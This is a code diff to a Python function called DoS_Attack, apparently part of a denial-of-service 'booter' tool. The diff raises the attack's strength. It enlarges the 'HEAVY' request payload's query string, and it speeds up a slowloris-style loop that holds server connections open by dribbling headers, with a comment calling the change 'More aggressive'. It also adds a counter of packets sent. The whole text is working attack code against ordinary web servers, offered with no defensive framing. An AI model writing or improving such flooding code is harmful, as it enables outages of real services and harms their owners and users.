@@ -68,7 +68,7 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
         payload_patterns = {
             'PY': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
                   ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
-            'HEAVY': f"{type_attack} /{url_path}?{'&'.join(f'q{i}={generate_post_body(100)}' for i in range(10))} HTTP/1.1\r\nHost: {host}\r\n" + \
+            'HEAVY': f"{type_attack} /{url_path}?{'&'.join(f'q{i}={generate_post_body(200)}' for i in range(50))} HTTP/1.1\r\nHost: {host}\r\n" + \
                      ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
             'POST': f"POST /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
                     ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + \
@@ -90,8 +90,9 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
                 time.sleep(0.1)
             s.send(b"\r\n")
             while not stop_attack.is_set():
-                s.send(b"X-a: b\r\n")
-                time.sleep(1)
+                s.send(b"X-a: b\r\nX-b: c\r\n")
+                time.sleep(0.5)  # More aggressive
+                attack_stats["sent"] += 1
         else:
             # Send multiple requests per connection with keep-alive
             for _ in range(booter_sent):
